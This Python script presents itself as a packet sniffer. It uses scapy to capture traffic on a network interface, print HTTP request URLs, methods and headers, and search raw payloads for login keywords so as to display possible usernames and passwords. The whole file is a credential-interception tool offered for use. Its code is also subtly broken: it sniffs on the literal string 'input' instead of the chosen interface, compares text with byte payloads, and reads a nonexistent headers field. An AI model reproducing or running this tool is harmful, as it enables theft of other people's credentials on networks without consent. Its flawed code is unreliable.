#!/usr/bin/env python
from sys import version
import scapy.all as nitro
import pyfiglet
import netifaces

result = pyfiglet.figlet_format('404_is', font='slant')
print(result)

print("A packet sniffer designed by obadare victor")

print("avalible network interfaces are as follows:")

interfaces = netifaces.interfaces()
for interface in interfaces:
    print(interface)

input = input("kinkly input the interface you want to sniff:")

from scapy.layers import http

def sniff(hardwareinterface):
    nitro.sniff(iface=hardwareinterface, store=False, prn=process_sniffed_packet)

def get_url_fuction(packet):
    return packet [http.HTTPRequest].Host + packet [http.HTTPRequest].Path

def get_login_information(packet):
        if packet.haslayer(nitro.Raw):
           load = (packet[nitro.Raw]).load
           commonfields = ["username", "users", "pass", "login", "password", "name", "phone"]
           for commonfield in commonfields:
             if commonfield in load:
                 return load
               
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url_fuction(packet)
        print("[+} 404 is displaying HTTP Requests (url) >>" + url)

    if packet.haslayer(http.HTTPRequest):
        url = packet [http.HTTPRequest].Method
        print("\n\n[+} 404 is displaying HTTP Requests (method) >>" + url)
        
    if packet.haslayer(http.HTTPRequest):
        url = packet [http.HTTPRequest].Headers
        print("\n\n[+} 404 is displaying HTTP Requests (header) >>" + url)

        login_info = get_login_information(packet)
        if login_info:
            print("\n\n[+] 404 is displaying possible username/password" + "\n\n" + login_info )

sniff ("input")